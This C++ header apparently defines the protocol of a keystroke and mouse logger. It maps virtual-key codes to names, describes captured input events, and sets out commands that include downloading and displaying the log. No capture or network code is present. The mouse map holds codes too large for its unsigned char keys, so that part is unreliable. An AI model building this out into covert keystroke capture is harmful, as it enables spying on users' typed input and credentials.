#ifndef _PROTOCOL_HPP_
#define _PROTOCOL_HPP_

////////////////////////////////////
//        C++11 OBLIGATOIRE       //
////////////////////////////////////

#include <map>

static std::map<unsigned char, std::string> m_keycode2name = {
	{ 0, "unknown" },
	{ 0x01, "left mouse button" },{ 0x02, "right mouse button" },
	{ 0x03, "Control-break processing" },{ 0x04, "Middle mouse button" },
	{ 0x05, "X1 mouse button" },{ 0x06, "X2 mouse button" },
	{ 0x07, "Unknown button" },{ 0x08, "BACKSPACE" },
	{ 0x09, "TAB" },{ 0x0A, "Unknown button" },{ 0x0B, "Unknown button" },{ 0x0C, "CLEAR" },
	{ 0x0D, "ENTER" },{ 0x0E, "Unknown button" },{ 0x0F, "Unknown button" },
	{ 0x10, "SHIFT" },{ 0x11, "CTRL" },{ 0x12, "ALT" },{ 0x13, "PAUSE" },
	{ 0x14, "CAPS LOCK" },{ 0x15, "IME Kana mode" },{ 0x16, "Undefined button" },{ 0x17, "IME Junja mode" },
	{ 0x18, "IME final mode" },{ 0x19, "IME Hanja mode" },{ 0x1A, "Undefined button" },{ 0x1B, "ESC" },
	{ 0x1C, "IME convert" },{ 0x1D, "IME nonconvert" },{ 0x1E, "IME accept" },{ 0x1F, "IME mode change request" },{ 0x20, "SPACEBAR" },{ 0x21, "PAGE UP" },
	{ 0x22, "PAGE DOWN" },{ 0x23, "END" },{ 0x24, "HOME" },{ 0x25, "LEFT ARROW" },{ 0x26, "UP ARROW" },{ 0x27, "RIGHT ARROW" },{ 0x28, "DOWN ARROW" },
	{ 0x29, "SELECT" },{ 0x2A, "PRINT" },{ 0x2B, "EXECUTE" },{ 0x2C, "PRINT SCREEN" },{ 0x2D, "INS" },{ 0x2E, "DEL" },{ 0x2F, "HELP" },
	{ 0x30, "0" },{ 0x31, "1" },{ 0x32, "2" },{ 0x33, "3" },{ 0x34, "4" },{ 0x35, "5" },{ 0x36, "6" },{ 0x37, "7" },{ 0x38, "8" },{ 0x39, "9" },
	//0x3A-40 -> Undefined
	{ 0x41, "A" },{ 0x42, "B" },{ 0x43, "C" },
	{ 0x44, "D" },{ 0x45, "E" },{ 0x46, "F" },
	{ 0x47, "G" },{ 0x48, "H" },{ 0x49, "I" },
	{ 0x4A, "J" },{ 0x4B, "K" },{ 0x4C, "L" },
	{ 0x4D, "M" },{ 0x4E, "N" },{ 0x4F, "O" },
	{ 0x50, "P" },{ 0x51, "Q" },{ 0x52, "R" },
	{ 0x53, "S" },{ 0x54, "T" },{ 0x55, "U" },
	{ 0x56, "V" },{ 0x57, "W" },{ 0x58, "X" },
	{ 0x59, "Y" },{ 0x5A, "Z" }
};

static std::map<unsigned char, std::string> m_mousecode2name = {
	{ 0x0202, "Left button up" },
	{ 0x0201, "Left button down" },
	{ 0x0205, "Right button up" },
	{ 0x0204, "Right button down" },
};

enum eventSource {UNKNOWN = 0, KEYBOARD, MOUSE};
enum m_keycodeStatus { UNDEFINED = 0, UP, DOWN };

/*
typedef struct		s_proto
{
	eventSource		source; //See enum eventSource
	m_keycodeStatus key_status; //For keyboard only, will be ignored otherwise
	unsigned char	button_code; //vkCode for Keyboard and wParam for mouse
	int				x_pos; //For mouse x position only, will be ignored otherwise
	int				y_pos; //For mouse y position only, will be ignored otherwise
}					t_proto;
*/

enum commandType { BAD = 0, CLOSE, DOWNLOAD_LOG, DISPLAY_LOG };

typedef struct      s_cmd
{
	commandType		cmd;
	char			buffer[255];
}					t_cmd;

#endif /* !_PROTOCOL_HPP_ */